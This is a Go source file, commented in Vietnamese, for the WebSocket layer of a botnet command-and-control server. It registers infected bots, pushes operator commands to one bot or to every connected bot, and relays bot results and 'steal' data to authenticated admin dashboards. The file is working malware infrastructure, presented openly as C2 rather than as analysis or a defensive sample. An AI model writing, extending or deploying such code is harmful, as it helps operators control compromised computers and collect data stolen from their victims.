package main

import (
    "encoding/json"
    "log"
    "net/http"
    "sync"
    "time"
    
    "github.com/gin-gonic/gin"
    "github.com/gorilla/websocket"
)

var upgrader = websocket.Upgrader{
    ReadBufferSize:  4096,
    WriteBufferSize: 4096,
    CheckOrigin: func(r *http.Request) bool {
        return true // Chap nhan moi ket noi trong C2
    },
}

// Quan ly cac ket noi WebSocket
type WSManager struct {
    mu           sync.RWMutex
    botConns     map[string]*websocket.Conn     // BotID -> WS connection
    adminConns   map[*websocket.Conn]bool        // Admin connections
    pendingCmds  map[string][]*Command           // BotID -> pending commands
}

var wsManager = &WSManager{
    botConns:    make(map[string]*websocket.Conn),
    adminConns:  make(map[*websocket.Conn]bool),
    pendingCmds: make(map[string][]*Command),
}

// Endpoint WebSocket cho bot
func HandleBotWebSocket(c *gin.Context) {
    botID := c.Query("bot_id")
    if botID == "" {
        c.JSON(http.StatusBadRequest, gin.H{"error": "thieu bot_id"})
        return
    }
    
    conn, err := upgrader.Upgrade(c.Writer, c.Request, nil)
    if err != nil {
        log.Printf("[WS] Loi upgrade bot WS: %v", err)
        return
    }
    
    wsManager.mu.Lock()
    wsManager.botConns[botID] = conn
    wsManager.mu.Unlock()
    
    log.Printf("[WS] Bot da ket noi: %s", botID)
    
    // Cap nhat bot online
    UpdateBotCheckin(botID, c.ClientIP())
    
    // Broadcast den admin
    BroadcastToAdmins(WSMessage{
        Type:      "bot_connected",
        BotID:     botID,
        Timestamp: time.Now().Unix(),
    })
    
    defer func() {
        wsManager.mu.Lock()
        delete(wsManager.botConns, botID)
        wsManager.mu.Unlock()
        conn.Close()
        
        // Danh dau bot offline
        DB.Exec("UPDATE bots SET status = 'offline', last_seen = CURRENT_TIMESTAMP WHERE id = ?", botID)
        
        BroadcastToAdmins(WSMessage{
            Type:      "bot_disconnected",
            BotID:     botID,
            Timestamp: time.Now().Unix(),
        })
        
        log.Printf("[WS] Bot da ngat ket noi: %s", botID)
    }()
    
    // Doc tin nhan tu bot
    for {
        _, message, err := conn.ReadMessage()
        if err != nil {
            if websocket.IsUnexpectedCloseError(err, websocket.CloseGoingAway, websocket.CloseAbnormalClosure) {
                log.Printf("[WS] Loi doc tu bot %s: %v", botID, err)
            }
            break
        }
        
        var msg WSMessage
        if err := json.Unmarshal(message, &msg); err != nil {
            log.Printf("[WS] Loi parse message tu bot %s: %v", botID, err)
            continue
        }
        
        msg.BotID = botID
        msg.Timestamp = time.Now().Unix()
        
        // Xu ly ket qua tu bot
        if msg.Type == "result" && msg.CommandID != "" {
            UpdateCommandResult(msg.CommandID, "completed", msg.Result)
            BroadcastToAdmins(msg)
        } else if msg.Type == "steal" {
            SaveStealData(botID, msg.Module, msg.Result)
            BroadcastToAdmins(msg)
        }
    }
}

// Endpoint WebSocket cho admin
func HandleAdminWebSocket(c *gin.Context) {
    // Xac thuc admin qua token trong query parameter
    token := c.Query("token")
    if token == "" {
        c.JSON(http.StatusUnauthorized, gin.H{"error": "thieu token"})
        return
    }
    
    _, err := ValidateJWT(token)
    if err != nil {
        c.JSON(http.StatusUnauthorized, gin.H{"error": "token khong hop le"})
        return
    }
    
    conn, err := upgrader.Upgrade(c.Writer, c.Request, nil)
    if err != nil {
        log.Printf("[WS] Loi upgrade admin WS: %v", err)
        return
    }
    
    wsManager.mu.Lock()
    wsManager.adminConns[conn] = true
    wsManager.mu.Unlock()
    
    log.Println("[WS] Admin da ket noi")
    
    defer func() {
        wsManager.mu.Lock()
        delete(wsManager.adminConns, conn)
        wsManager.mu.Unlock()
        conn.Close()
        log.Println("[WS] Admin da ngat ket noi")
    }()
    
    // Gui du lieu thong ke ban dau
    stats, _ := GetStats()
    initialMsg := WSMessage{
        Type:      "stats_update",
        Result:    mustMarshal(stats),
        Timestamp: time.Now().Unix(),
    }
    conn.WriteJSON(initialMsg)
    
    // Doc tin nhan tu admin (neu can gui lenh qua WS)
    for {
        _, _, err := conn.ReadMessage()
        if err != nil {
            if websocket.IsUnexpectedCloseError(err, websocket.CloseGoingAway, websocket.CloseAbnormalClosure) {
                log.Printf("[WS] Loi doc tu admin: %v", err)
            }
            break
        }
        // Admin co the gui lenh qua WS, xu ly o day neu can
    }
}

// Broadcast message den tat ca admin dang ket noi
func BroadcastToAdmins(msg WSMessage) {
    wsManager.mu.RLock()
    defer wsManager.mu.RUnlock()
    
    for conn := range wsManager.adminConns {
        err := conn.WriteJSON(msg)
        if err != nil {
            log.Printf("[WS] Loi broadcast den admin: %v", err)
        }
    }
}

// Broadcast lenh den bot qua WebSocket
func BroadcastCommandToBot(cmd *Command) {
    wsManager.mu.RLock()
    defer wsManager.mu.RUnlock()
    
    conn, exists := wsManager.botConns[cmd.BotID]
    if !exists {
        // Bot khong ket noi qua WS, lenh se duoc lay qua checkin
        return
    }
    
    msg := WSMessage{
        Type:      "command",
        CommandID: cmd.ID,
        BotID:     cmd.BotID,
        Module:    cmd.Module,
        Action:    cmd.Action,
        Params:    cmd.Params,
        Timestamp: time.Now().Unix(),
    }
    
    err := conn.WriteJSON(msg)
    if err != nil {
        log.Printf("[WS] Loi gui lenh den bot %s: %v", cmd.BotID, err)
    }
}

// Gui lenh den tat ca bot online
func BroadcastCommandToAllBots(cmd *Command) {
    wsManager.mu.RLock()
    defer wsManager.mu.RUnlock()
    
    msg := WSMessage{
        Type:      "command",
        CommandID: cmd.ID,
        BotID:     cmd.BotID,
        Module:    cmd.Module,
        Action:    cmd.Action,
        Params:    cmd.Params,
        Timestamp: time.Now().Unix(),
    }
    
    for botID, conn := range wsManager.botConns {
        cmdCopy := msg
        cmdCopy.BotID = botID
        cmdCopy.CommandID = GenerateUUID()
        err := conn.WriteJSON(cmdCopy)
        if err != nil {
            log.Printf("[WS] Loi gui lenh den bot %s: %v", botID, err)
        }
    }
}

// Helper: chuyen struct thanh JSON string
func mustMarshal(v interface{}) string {
    data, err := json.Marshal(v)
    if err != nil {
        return "{}"
    }
    return string(data)
}